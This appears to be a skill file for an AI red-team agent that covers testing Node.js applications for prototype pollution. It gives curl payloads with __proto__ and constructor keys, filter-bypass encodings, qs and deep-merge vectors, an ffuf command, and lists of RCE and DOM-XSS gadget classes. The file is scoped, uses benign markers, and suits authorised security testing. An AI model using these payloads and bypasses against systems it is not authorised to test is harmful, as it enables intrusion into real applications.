---
name: prototype-pollution
description: Test Node.js prototype pollution through prototype keys, deep-merge gadgets, parser confusion, and bounded impact confirmation
origin: RedteamOpencode
---

# Prototype Pollution

## When to Activate

- A Node.js endpoint accepts nested user-controlled objects in JSON, form data, query strings, or headers and merges them recursively
- Source or dependencies show `lodash.merge`, `deepmerge`, `qs`/Express parameter parsing, or a template or sandbox option flowing from input

## Tools

`run_tool curl`, `run_tool ffuf`, `jq`.

## Methodology

### 1. Select a Benign Detection Path
Use a disposable account, a non-production merge endpoint, and a diagnostic response that exposes defaults or option metadata. Establish the un-polluted behavior before testing; do not use authorization, price, shell, or process options as a detector.

```bash
MARKER="proto-$(python3 -c 'import secrets; print(secrets.token_hex(4))')"
run_tool curl -sS --connect-timeout 5 --max-time 20 \
  -D "$DIR/scans/proto-before-$MARKER.headers" \
  -o "$DIR/scans/proto-before-$MARKER.json" "$OBSERVE_URL"
```

### 2. Test Prototype Keys
Send the canonical `?__proto__[x]=y` and `?constructor[prototype][x]=y` query vectors, then repeat `__proto__` and `constructor.prototype` in JSON bodies. Change only the key path; keep the value harmless and use a fresh marker for every probe.

```bash
run_tool curl -sS --connect-timeout 5 --max-time 20 \
  "$URL?__proto__[pollutionProbe]=true" # direct prototype key
run_tool curl -sS --connect-timeout 5 --max-time 20 \
  "$URL?constructor[prototype][pollutionProbe]=true" # constructor prototype path
run_tool curl -sS --connect-timeout 5 --max-time 20 -X POST "$MERGE_URL" \
  -H 'Content-Type: application/json' \
  --data '{"__proto__":{"pollutionProbe":true}}' # JSON prototype key
run_tool curl -sS --connect-timeout 5 --max-time 20 -X POST "$MERGE_URL" \
  -H 'Content-Type: application/json' \
  --data '{"constructor":{"prototype":{"pollutionProbe":true}}}' # JSON constructor path
```

### 2b. Filter-Bypass Key Encodings
If `__proto__`/`constructor`/`prototype` are stripped or rejected by input validation, test alternate representations that some parsers still normalize to the same dangerous key before the filter runs (or after it, if filtering happens once and the parser re-normalizes afterward).

```bash
run_tool curl -sS --connect-timeout 5 --max-time 20 -X POST "$MERGE_URL" -H 'Content-Type: application/json' \
  --data '{"constructor":{"prototype":{"pollutionProbe":true}}}'  # unicode-escaped key inside JSON string
run_tool curl -sS --connect-timeout 5 --max-time 20 \
  "$URL?a%5B__proto__%5D%5BpollutionProbe%5D=true"                    # URL-encoded bracket path
run_tool curl -sS --connect-timeout 5 --max-time 20 -X POST "$MERGE_URL" -H 'Content-Type: application/json' \
  --data '{"a":{"__pro__proto__to__":{"pollutionProbe":true}}}'       # nested-strip bypass: filter removes one "__proto__" substring, leaving the real key
run_tool curl -sS --connect-timeout 5 --max-time 20 -X POST "$MERGE_URL" -H 'Content-Type: application/json' \
  --data '{"a.__proto__.pollutionProbe":"true"}'                      # dot-path key for libraries using `_.set`/path-string merges instead of nested objects
```
Also test polluting `Array.prototype` and `Object.prototype` separately — a gadget may only read from one, and some sanitizers only block `Object.prototype` keys while leaving `Array.prototype`/`Function.prototype` reachable through the same merge call.

### 3. Exercise Deep-Merge and Parser Gadgets
Test one recursive-merge representation at a time. `lodash.merge` and `deepmerge` can copy nested keys into a shared target; `qs` and Express query parsing can materialize bracket paths and arrays. Check parser normalization, depth limits, duplicate parameters, and whether validation strips prototype keys.

```bash
run_tool curl -sS --connect-timeout 5 --max-time 20 \
  "$URL?a[__proto__][pollutionProbe]=true" # qs-style path
run_tool curl -sS --connect-timeout 5 --max-time 20 \
  "$URL?a[constructor][prototype][pollutionProbe]=true" # nested constructor path
run_tool curl -sS --connect-timeout 5 --max-time 20 \
  "$URL?a[pollutionProbe]=one&a[pollutionProbe]=two" # duplicate-key behavior
```

### 4. Confirm Persistence, Not Assumption
Pollute one benign key, then issue a distinct second request against the same application or diagnostic endpoint. Confirm only when the second request shows a reproducible behavior change attributable to the key; a 200, a changed header, or an echoed payload is not pollution.

```bash
MARKER="proto-$(python3 -c 'import secrets; print(secrets.token_hex(4))')"
run_tool curl -sS --connect-timeout 5 --max-time 20 -X POST "$MERGE_URL" \
  -H 'Content-Type: application/json' \
  --data "{\"__proto__\":{\"pollutionProbe\":\"$MARKER\"}}" # one bounded probe
run_tool curl -sS --connect-timeout 5 --max-time 20 \
  -D "$DIR/scans/proto-after-$MARKER.headers" \
  -o "$DIR/scans/proto-after-$MARKER.json" "$OBSERVE_URL"
```

Repeat with a new marker and `constructor.prototype` only if the first path is rejected or produces no observable effect. A worker restart that clears the key is evidence of process-local behavior, not a confirmed global primitive.

### 5. Map RCE Gadget Classes
Keep gadget mapping read-only until the pollution primitive is confirmed.

- `child_process.spawn` or `exec`: polluted `shell`, `cwd`, `env`, `argv0`, `stdio`, timeout, or buffer options can alter a later process call.
- EJS: inspect versioned options such as `client`, `escapeFunction`, and `compileDebug`; Pug: inspect `cache`, `filename`, `basedir`, and plugin options; Nunjucks: inspect `env`, `autoescape`, and `throwOnUndefined`.
- `vm` or `vm2`: inspect host-function, timeout, and sandbox options for weakened isolation; do not assume a version-specific escape exists.
- Treat template and sandbox gadgets as exploit hypotheses, not proof; record the exact library, version, polluted key, and call path.

### 5b. Client-Side Prototype Pollution
Treat client-side JS bundles as their own surface, distinct from the Node.js server gadgets above — coordinate with `source-analysis` for the static discovery step and `xss-testing` for the DOM-sink chain.

- [ ] Trigger pollution via URL fragment/query parsing libraries (`jQuery.extend(true, ...)`, older `qs` in the browser, hand-rolled `parseQuery` helpers) using `?__proto__[x]=y` or `#__proto__[x]=y` and observe whether a later DOM read of `x` on any object reflects the polluted value
- [ ] Look for gadgets that turn a polluted property into DOM XSS: a library that reads `Object.prototype.innerHTML`, `srcdoc`, `onerror`, or a templating default from a prototype-inherited property and writes it unsanitized into the page
- [ ] Confirm with a benign marker property first (e.g., pollute `pollutionProbe` and check `({}).pollutionProbe` in an injected `javascript:` bookmarklet or via a diagnostic console log), then only escalate to a `<script>`/`onerror` gadget once a concrete unsanitized sink consuming that property is identified

### 6. Confirm Versus Exploit
Use one bounded pollution probe with an observable second-request effect for confirmation. The analyst owns the parser triage; the `exploit-developer` owns any RCE chain, command execution proof, persistence, or post-exploitation. Do not chain a process, template, or sandbox gadget from this skill.

### 7. Bound Fuzzing and Tooling
Use `run_tool ffuf` only with a small reviewed parameter list, one request at a time, and a short time budget. If `ffuf` is absent, replay one candidate with `run_tool curl`; use `jq` to compare saved response artifacts and retain the raw headers.

```bash
run_tool ffuf -u "$URL?Fuzz=pollutionProbe" -w "$DIR/wordlists/prototype-keys.txt" \
  -mc 200 -fs 0 -t 1 -rate 1 -maxtime 20
```

## References

`references/payloads/business-logic-payloads.md`, `references/vuln-checklists/A05-injection.md`, `references/vuln-checklists/A06-insecure-design.md`, `references/api-security/API03-broken-property-authz.md`, `references/tools/fuzzing/ffuf.md`.
